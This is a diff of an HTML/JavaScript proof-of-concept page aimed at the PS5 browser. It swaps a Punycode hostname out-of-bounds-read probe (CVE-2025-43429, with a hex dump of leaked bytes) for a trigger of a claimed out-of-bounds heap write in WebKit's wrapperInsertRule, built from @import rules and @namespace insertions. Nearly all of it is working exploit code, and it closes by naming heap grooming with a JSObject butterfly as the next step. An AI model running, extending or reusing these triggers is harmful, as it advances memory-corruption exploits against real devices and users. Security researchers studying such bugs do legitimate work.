@@ -2,95 +2,85 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-43429 - High Expansion Punycode Overflow</title>
+<title>PS5 Bug 1 - wrapperInsertRule OOB Write</title>
+<style id="sheet">
+@import url("data:text/css,body{}");
+</style>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting CVE-2025-43429 High Expansion Punycode Overflow...');
+L('[*] Starting wrapperInsertRule OOB Write test...');
 
-// Characters that expand massively in Punycode/IDNA
-const expanders = [
-    { name: 'FB03 (ffi, 3x)', char: '\uFB03' },
-    { name: 'FB01 (fi, 2x)', char: '\uFB01' },
-    { name: '212B (Angstrom, 2x)', char: '\u212B' },
-    { name: '3371 (hPa, 3x)', char: '\u3371' },
-];
+// Bug: StyleSheetContents::wrapperInsertRule uses global `index` instead of
+// adjusted `childVectorIndex` when inserting @namespace rules.
+//
+// If we have @import rules, the global index is offset by the import count.
+// Inserting @namespace at index 1 (after one @import) means:
+//   childVectorIndex = 1 - 1 = 0  (correct local index)
+//   but the code inserts at index 1 (global) into an empty m_namespaceRules vector
+//   => OOB write at position 1 in a size-0 vector
 
-for (const exp of expanders) {
-    L('\n--- Testing ' + exp.name + ' ---');
-    
-    // Test sizes from 500 to 1500
-    for (let size = 500; size <= 1500; size += 100) {
-        try {
-            let domain = exp.char.repeat(size) + '.com';
-            let url = new URL('http://' + domain);
-            
-            let hn = url.hostname;
-            L('[+] Size ' + size + ': OK. Hostname length: ' + hn.length);
-            
-            // If hostname length > 2048, we definitely triggered the OOB read
-            if (hn.length > 2048) {
-                L('[!] OVER 2048! OOB READ CONFIRMED!');
-                let hex = [];
-                for (let i = 0; i < hn.length; i++) {
-                    hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
-                }
-                L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
-                L('[!] THIS IS THE LEAK!');
-                break;
-            }
-            
-            // Check for anomalies (non-ASCII or control chars in Punycode)
-            let anomalies = 0;
-            for (let i = 0; i < hn.length; i++) {
-                let code = hn.charCodeAt(i);
-                if (code > 127 || (code < 32 && code !== 45 && code !== 46)) {
-                    anomalies++;
-                }
-            }
-            if (anomalies > 0) {
-                L('[!] ANOMALIES DETECTED! ' + anomalies + ' non-ASCII chars!');
-            }
-            
-        } catch (e) {
-            if (e.message.includes('cannot be parsed')) {
-                L('[-] Size ' + size + ': Rejected by URL parser');
-            } else {
-                L('[!] Size ' + size + ': ERROR: ' + e.message);
-            }
-        }
-    }
+const sheet = document.getElementById('sheet').sheet;
+L('[*] Initial cssRules: ' + sheet.cssRules.length);
+
+// Insert @namespace at index 1 (after the @import at index 0)
+// This triggers the OOB write
+try {
+    sheet.insertRule('@namespace foo url(http://example.com);', 1);
+    L('[+] insertRule succeeded! cssRules: ' + sheet.cssRules.length);
+    L('[+] If we reached here without crash, the OOB write happened silently.');
+    L('[+] Adjacent heap memory may be corrupted.');
+} catch (e) {
+    L('[!] insertRule threw: ' + e.message);
 }
 
-// Also try via URL.host setter
-L('\n--- Testing via URL.host setter ---');
-for (const exp of expanders) {
-    L('\n--- Setter: ' + exp.name + ' ---');
+// Try with more @import rules to increase the OOB offset
+L('\n--- Test 2: Multiple @import rules ---');
+const sheet2 = document.createElement('style');
+document.head.appendChild(sheet2);
+sheet2.textContent = '';
+// Add 5 @import rules
+for (let i = 0; i < 5; i++) {
     try {
-        let domain = exp.char.repeat(1000) + '.com';
-        let url = new URL('http://example.test/');
-        url.host = domain;
-        
-        let hn = url.hostname;
-        L('[+] Setter size 1000: OK. Hostname length: ' + hn.length);
-        
-        if (hn.length > 2048) {
-            L('[!] SETTER OVER 2048! OOB READ CONFIRMED!');
-            let hex = [];
-            for (let i = 0; i < hn.length; i++) {
-                hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
-            }
-            L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
-        }
-    } catch (e) {
-        L('[!] Setter threw: ' + e.message);
-    }
+        sheet2.insertRule('@import url("data:text/css,body{}");', i);
+    } catch(e) {}
+}
+L('[*] Sheet2 cssRules: ' + sheet2.cssRules.length);
+
+// Now insert @namespace at index 5 (after all @imports)
+// childVectorIndex = 5 - 5 = 0, but code inserts at index 5
+// OOB write at position 5 in empty m_namespaceRules
+try {
+    sheet2.insertRule('@namespace bar url(http://example.com);', 5);
+    L('[+] Test 2 succeeded! OOB write with offset 5.');
+} catch (e) {
+    L('[!] Test 2 threw: ' + e.message);
+}
+
+// Test 3: Large offset to corrupt more memory
+L('\n--- Test 3: Large offset ---');
+const sheet3 = document.createElement('style');
+document.head.appendChild(sheet3);
+for (let i = 0; i < 100; i++) {
+    try {
+        sheet3.insertRule('@import url("data:text/css,body{}");', i);
+    } catch(e) { break; }
+}
+L('[*] Sheet3 cssRules: ' + sheet3.cssRules.length);
+
+try {
+    sheet3.insertRule('@namespace baz url(http://example.com);', sheet3.cssRules.length);
+    L('[+] Test 3 succeeded! OOB write with offset ' + sheet3.cssRules.length + '.');
+} catch (e) {
+    L('[!] Test 3 threw: ' + e.message);
 }
 
 L('\n[*] Test finished.');
+L('[*] If no crash, we have silent heap corruption.');
+L('[*] Next step: groom heap to place a JSObject butterfly after the namespace vector.');
 </script>
 </body>
 </html>
